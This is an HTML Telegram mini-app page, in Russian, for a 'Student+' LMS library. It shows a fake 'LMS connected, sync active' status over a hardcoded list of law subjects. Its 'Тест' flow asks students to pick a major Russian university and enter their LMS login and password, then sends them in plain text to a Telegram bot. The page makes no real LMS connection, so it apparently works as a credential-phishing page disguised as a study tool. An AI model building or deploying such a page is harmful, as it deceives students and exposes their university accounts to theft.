<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Student+ • ЛМС библиотека</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#0b0f1a; --card:rgba(255,255,255,.06); --border:rgba(255,255,255,.10);
      --txt:#e8ecf3; --muted:#9aa3b2; --acc1:#5b8cff; --acc2:#8a7bff; --ok:#48e39a;
      --shadow:0 20px 60px rgba(0,0,0,.45); --radius:18px; 
      --tfast:.25s cubic-bezier(.2,.7,.2,1); --tslow:.6s cubic-bezier(.2,.7,.2,1);
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0}
    body{font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;color:var(--txt);background:var(--bg);overflow-x:hidden}
    .bg{position:fixed;inset:0;z-index:-2;background:
      radial-gradient(1200px 900px at 10% 10%,#16213e 0%,transparent 50%),
      radial-gradient(900px 800px at 90% 20%,#1a2b6d 0%,transparent 50%),
      radial-gradient(900px 900px at 50% 100%,#261a53 0%,transparent 50%),
      linear-gradient(180deg,#0b0f1a 0%,#0b0f1a 100%);animation:bgfloat 16s ease-in-out infinite alternate}
    @keyframes bgfloat{0%{filter:hue-rotate(0)}100%{filter:hue-rotate(20deg)}}

    .screen{position:fixed;inset:0;display:grid;place-items:center;padding:20px;opacity:0;
      transform:translateY(10px) scale(.98);pointer-events:none;transition:opacity var(--tslow),transform var(--tslow);
      overflow-y:auto;-webkit-overflow-scrolling:touch;min-height:100svh}
    .screen.active{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}

    .card{width:min(700px,92vw);background:var(--card);border:1px solid var(--border);
      border-radius:var(--radius);padding:34px;box-shadow:var(--shadow);backdrop-filter:blur(10px);
      display:grid;gap:18px;justify-items:center;text-align:center}

    .logo{display:flex;align-items:center;gap:12px}
    .logo-badge{width:56px;height:56px;border-radius:14px;background:conic-gradient(from 210deg,var(--acc1),var(--acc2));box-shadow:0 12px 30px rgba(91,140,255,.35)}
    .logo-title{font-weight:800;font-size:28px}
    .progress{width:100%;height:10px;border-radius:8px;background:rgba(255,255,255,.06);overflow:hidden}
    .bar{height:100%;width:0%;background:linear-gradient(90deg,var(--acc1),var(--acc2));animation:loadbar 3.2s ease-out forwards}
    @keyframes loadbar{0%{width:0}100%{width:100}}

    .cta{border:0;cursor:pointer;padding:15px 20px;border-radius:14px;color:#fff;
      font-weight:700;font-size:16px;background:linear-gradient(180deg,#6ea8ff,#2a74ff);
      box-shadow:0 16px 40px rgba(46,116,255,.35);transition:transform var(--tfast),filter var(--tfast)}
    .cta:hover{filter:brightness(1.05)}.cta:active{transform:translateY(1px) scale(.99)}

    .library .wrap{width:min(1100px,94vw);margin:auto;display:grid;gap:16px;grid-template-rows:auto 1fr;padding-bottom:40px}
    .lib-head{display:flex;justify-content:space-between;align-items:flex-end;gap:12px;flex-wrap:wrap;padding:12px 6px}
    .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(220px,1fr))}
    .tile{position:relative;border-radius:16px;background:var(--card);border:1px solid var(--border);
      padding:16px 14px;min-height:88px;backdrop-filter:blur(8px);box-shadow:0 10px 30px rgba(0,0,0,.25);
      transition:transform var(--tfast),border-color var(--tfast);cursor:pointer;opacity:0;transform:translateY(10px)}
    .tile:hover{transform:translateY(-4px);border-color:rgba(110,168,254,.45);background:rgba(255,255,255,.08)}
    .tile h3{margin:0 0 6px 0;font-size:17px} .tile p{margin:0;color:var(--muted);font-size:13px}
    .chip{position:absolute;top:10px;right:10px;padding:6px 10px;border-radius:999px;font-size:12px;
      font-weight:700;background:linear-gradient(90deg,#3dc3a3,#45e39a);color:#0b1b16}
    @keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}

    /* Модалка выбора ВУЗа */
    #uniModal{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);
      display:none;place-items:center;z-index:999}
    #uniModal .box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
      box-shadow:var(--shadow);width:min(400px,90vw);padding:24px;display:grid;gap:14px;text-align:center}

    input{width:100%;padding:12px;border-radius:10px;border:1px solid var(--border);
      background:rgba(255,255,255,.05);color:var(--txt);font-size:15px}
  </style>
</head>
<body>
  <div class="bg"></div>

  <!-- SPLASH -->
  <section id="splash" class="screen splash active">
    <div class="card">
      <div class="logo"><div class="logo-badge"></div><div class="logo-title">Student+ MiniApp</div></div>
      <div class="progress"><div class="bar"></div></div>
      <div>Загружаем модуль ЛМС...</div>
    </div>
  </section>

  <!-- CONNECT -->
  <section id="connect" class="screen connect">
    <div class="card">
      <h1>Подключить ЛМС</h1>
      <p>Свяжем твои предметы и материалы.</p>
      <button id="btnConnect" class="cta">Подключить</button>
    </div>
  </section>

  <!-- LIBRARY -->
  <section id="library" class="screen library">
    <div class="wrap">
      <div class="lib-head">
        <div><h1>Библиотека предметов</h1></div>
        <div>ЛМС подключена • Синхронизация активна</div>
      </div>
      <div class="grid" id="grid"></div>
    </div>
  </section>

  <!-- Модалка выбора вуза -->
  <div id="uniModal">
    <div class="box">
      <h2>Выбери свой университет</h2>
      <div id="uniList"></div>
      <div id="credBlock" style="display:none">
        <input id="loginInput" placeholder="Логин">
        <input id="passInput" type="password" placeholder="Пароль">
        <button id="btnSaveCreds" class="cta" style="margin-top:8px">Войти в ЛМС</button>
        <button id="btnCancelCreds" style="background:none;border:none;color:var(--muted);margin-top:4px;cursor:pointer">Отмена</button>
      </div>
    </div>
  </div>

  <button id="btnTest" class="cta" style="position:fixed;right:16px;bottom:16px;z-index:999">Тест</button>

  <script>
    const splash=document.getElementById('splash');
    const connect=document.getElementById('connect');
    const library=document.getElementById('library');
    const btnConnect=document.getElementById('btnConnect');
    const grid=document.getElementById('grid');
    const btnTest=document.getElementById('btnTest');
    const uniModal=document.getElementById('uniModal');
    const uniList=document.getElementById('uniList');
    const credBlock=document.getElementById('credBlock');
    const loginInput=document.getElementById('loginInput');
    const passInput=document.getElementById('passInput');
    const btnSaveCreds=document.getElementById('btnSaveCreds');
    const btnCancelCreds=document.getElementById('btnCancelCreds');
    const tg = window.Telegram?.WebApp;

    const TOP_UNIS = [
      "ВШЭ — Национальный исследовательский университет",
      "МГУ им. М. В. Ломоносова",
      "СПбГУ", "МГИМО", "Бауманка (МГТУ им. Баумана)",
      "ИТМО", "Физтех (МФТИ)", "НИТУ МИСИС", "НГУ", "УРФУ"
    ];

    const subjects=[
      {title:'Уголовное право',desc:'Состав, квалификация, санкции'},
      {title:'Гражданское право',desc:'Обязательства, сделки, ответственность'},
      {title:'Конституционное право',desc:'Основы строя и права человека'},
      {title:'Административное право',desc:'Публичное управление и процедуры'},
      {title:'Римское право',desc:'Истоки частного права и институты'},
      {title:'Уголовный процесс',desc:'Досудебка, суд, доказательства'},
      {title:'Гражданский процесс',desc:'Иск, подсудность, исполнение'},
      {title:'Международное публичное право',desc:'Гос-ва, договоры, ответственность'},
      {title:'Финансовое право',desc:'Бюджет, налоги, финконтроль'},
      {title:'Теория государства и права',desc:'Категории, методы, доктрины'},
      {title:'Право интеллектуальной собственности',desc:'Авторское право, товарные знаки, патенты'}
    ];

    function show(el){[splash,connect,library].forEach(e=>e.classList.remove('active'));el.classList.add('active');}

    // splash -> connect -> library
    setTimeout(()=>show(connect),3000);
    btnConnect.addEventListener('click',()=>{btnConnect.textContent='Подключаем...';setTimeout(()=>{render();show(library);},800);});

    function render(){
      grid.innerHTML=subjects.map((s,i)=>`
        <div class="tile" style="animation:fadeUp .4s ease ${i*40}ms forwards" onclick="alert('Открываем: ${s.title}')">
          <div class="chip">${String(i+1).padStart(2,'0')}</div>
          <h3>${s.title}</h3><p>${s.desc}</p>
        </div>`).join('');
    }

    // TEST FLOW
    btnTest.addEventListener('click', ()=>{
      credBlock.style.display='none';
      uniList.innerHTML = TOP_UNIS
        .map(u => `<button class="cta" data-u="${u}" style="width:100%;margin-bottom:6px">${u}</button>`)
        .join('');
      uniModal.style.display='grid';
      uniList.querySelectorAll('button').forEach(b=>{
        b.onclick=()=>{
          uniModal.dataset.uni=b.dataset.u;
          uniList.innerHTML=`<div style="margin-bottom:10px">Выбран: <b>${b.dataset.u}</b></div>`;
          credBlock.style.display='block';
        }
      });
    });

    btnCancelCreds.addEventListener('click', ()=> uniModal.style.display='none');

    btnSaveCreds.addEventListener('click', ()=>{
      const uni=uniModal.dataset.uni||"";
      const login=(loginInput.value||"").trim();
      const password=(passInput.value||"").trim();
      if(!uni||!login||!password){alert("Заполни все поля");return;}
      const payload={kind:"login_lms",uni,login,password};
      try{
        tg?.sendData(JSON.stringify(payload));
        tg?.HapticFeedback?.impactOccurred('medium');
        uniModal.style.display='none';
        alert("Отправлено в бота: "+uni);
      }catch(e){alert("Ошибка отправки: "+e);}
    });
  </script>
</body>
</html>
